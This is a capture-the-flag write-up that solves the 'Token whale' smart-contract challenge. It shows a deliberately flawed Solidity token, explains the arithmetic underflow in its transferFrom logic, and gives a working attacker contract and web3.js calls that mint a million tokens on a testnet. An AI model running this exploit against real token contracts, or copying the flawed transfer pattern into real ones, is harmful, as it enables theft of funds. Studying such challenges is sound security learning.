# 10. Token whale

This ERC20-compatible token is hard to acquire. There’s a fixed supply of `1,000` tokens, all of which are yours to start with.

Find a way to accumulate at least `1,000,000` tokens to solve this challenge.

## Target contract

```solidity
pragma solidity ^0.4.21;

contract TokenWhaleChallenge {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    function TokenWhaleChallenge(address _player) public {
        player = _player;
        totalSupply = 1000;
        balanceOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return balanceOf[player] >= 1000000;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    function _transfer(address to, uint256 value) internal {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;

        emit Transfer(msg.sender, to, value);
    }

    function transfer(address to, uint256 value) public {
        require(balanceOf[msg.sender] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);

        _transfer(to, value);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function transferFrom(address from, address to, uint256 value) public {
        require(balanceOf[from] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _transfer(to, value);
    }
}
```

## Vulnerability

The issue here is that `transferFrom` will internally call `_transfer` that operates on `balanceOf[msg.sender]` at `balanceOf[msg.sender] -= value;`. Through approval, the balance is not coming from `msg.sender` by definition. We can therefore cause an underflow on `balanceOf[msg.sender]` and get out with as many tokens as we'd like.

If you want more details : calling `transferFrom` from an approved addres that has 0 balance will eventually execute : `balanceOf[msg.sender] -= value`. Given that `msg.sender` has 0 balance, the underflow will set its balance to `2^256 - value`, thus generating a potentially huge number of tokens for free. In this challenge there is both a bad contract design (unchecked conditions and requirements) paired with unchecked arithmetic.

Let's use a very simple contract for that challenge :

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma abicoder v1;

contract Attacker {
  address targetContract;
  address owner;

  constructor (address _targetContract) {
    targetContract = _targetContract;
    owner = msg.sender;
  }

  function attack() public {
    // Causes an underflow in the balance of this contract in the token contract
    (bool success1, ) = targetContract.call(abi.encodeWithSignature("transferFrom(address,address,uint256)", owner, address(0), 1000));

    require(success1 == true, "Error in transferFrom");
    
    // Transfer 1000000 tokens to our address
    (bool success2, ) = targetContract.call(abi.encodeWithSignature("transfer(address,uint256)", owner, 1000000));

    require(success2 == true, "Error in transfer");
  }
}
```

And deploy to to the Ropsten network giving it as parameter the address of the challenge contract.

Now let's just approve this adversarial contract :

```js
const challengeContract = "0x98B45E96cE95Bc46fAfa0E1E3a8145cBf246c330";
const adversarialContract = "0x0544349F01942671dE3E0060a3759cC4698316aE";

const data = web3.eth.abi.encodeFunctionCall(
  {
    name: "approve",
    type: "function",
    inputs: [
      { type: "address", name: "spender" },
      { type: "uint256", name: "value" },
    ],
  },
  [adversarialContract, 1000]
);

await web3.eth.sendTransaction({
  from: accounts[0],
  to: challengeContract,
  data: data,
});

```

And launch the attack :

```js
const adversarialContract = "0x0544349F01942671dE3E0060a3759cC4698316aE";

const data = web3.eth.abi.encodeFunctionCall(
  {
    name: "attack",
    type: "function",
    inputs: [],
  },
  []
);

await web3.eth.sendTransaction({
  from: accounts[0],
  to: adversarialContract,
  data: data,
});
```

We now have a balance of 1001000 as we generated 1000000 tokens from the faulty `transferFrom` that in turn deduced 1000 from `msg.sender`. But `msg.sender` was not our address, it was the one of the adversarial contract. The adversarial contract finally send 1000000 tokens to our address, thus giving us a blance of 1001000 tokens.

You can submit the challenge.
